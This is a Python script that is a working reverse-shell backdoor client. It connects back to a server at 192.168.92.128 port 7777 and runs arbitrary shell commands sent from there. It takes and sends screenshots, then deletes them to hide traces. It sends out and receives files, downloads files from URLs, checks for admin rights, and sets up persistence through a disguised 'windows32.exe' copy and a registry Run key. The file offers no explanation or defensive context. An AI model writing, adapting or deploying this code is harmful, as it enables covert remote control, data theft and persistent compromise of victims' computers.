#!/usr/bin/python
import shutil
import socket
import subprocess
import json
import os
import base64
import sys
import time
import requests
from mss import mss
import pynput

def send_j(data):
    json_data = json.dumps(data)
    print(json_data)
    s.send(json_data.encode('utf-8'))

def recv_j():
        data = ""
        while True:
            try:
                data = data + s.recv(1024).decode('utf-8')
                print(data)#receiving chunks of 1024 bytes until json.loads(data) returns a correct json format
                return json.loads(data) #
            except ValueError: #if the output of json.loads(data) is not complete (not in json format)a
                continue

def web_download(url):
    response = requests.get(url)
    file_name = url.split("/")[-1] #last part of the url after /
    with open(file_name, "wb") as f:
        f.write(response.content)

def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def check_privs(): #check if user is admin by accessing an admin folder
    global admin
    try:
        tmp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows')]))
    except:
        admin = "User Privileges"
    else:
        admin = "Administrator Privileges"


def connect():
    while True:
        time.sleep(10) #reconnect every 10 seconds
        try:
            s.connect(("192.168.92.128", 7777))  # server IP and to which port to connect to
            shell()
            break
        except: #call connect function again until we get shell()
            connect()

def shell():
    while True:
        cmd = recv_j() # receive command from server
        cmd_l = cmd.split()
        print(cmd_l)
        if cmd_l[0].lower() == "kill_client":
            s.close()
            break

        elif cmd_l[0].lower() == "cd" and len(cmd) > 2:
            try:
                os.chdir(cmd_l[1]) #change directory to what's after "cd"
            except:
                continue

        elif cmd_l[0].lower() == "screenshot":
            try:
                screenshot() #take screenshot and its always saved as monitor-1.png
                with open("monitor-1.png","rb") as f:
                    send_j(base64.b64encode(f.read()).decode('utf-8'))
                    f.close()
                os.remove("monitor-1.png") #remove screenshot to hiding artifact
            except:
                send_j("failed to take screenshot")

        elif cmd_l[0].lower() == "check":
            check_privs()
            send_j(admin)

        elif cmd_l[0].lower() == "wget":
            url = cmd[5:]
            try:
                web_download(url)
                send_j("File Downloaded successfully!")
            except:
                send_j("Failed to download")



        elif cmd_l[0].lower() == "download":
            try:
                with open(cmd_l[1], "rb") as f:
                    send_j(base64.b64encode(f.read()).decode('utf-8'))
                    f.close()
            except:
                error = "File not found"
                send_j(base64.b64encode(error.encode('utf-8')).decode('utf-8'))

        elif cmd_l[0].lower() == "upload":
            try:
                with open(cmd_l[1], "wb") as f:
                    res = recv_j()
                    f.write(base64.b64decode(res))
                    f.close()
            except:
                send_j(base64.b64encode("Failedt o upload"))
        elif cmd_l[0].lower() == "persist":
            try:
                location = os.environ["appdata"] + "\\windows32.exe"  # set location naming
                if not os.path.exists(location):
                    shutil.copyfile(sys.executable, location)  # copy the executable to location set before as name windows32.exe (if compiled)
                    subprocess.call(
                        'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v BackService /t REG_SZ /d "' + location + '"',
                        shell=True)
                continue
            except:
                send_j("Error establishing persistence. Try again")
        else: #for all other commands send output to server
            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            send_j(output.decode('utf-8')) #send output to server

#adding a payload into registry run key



#socket creation
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect()
s.close()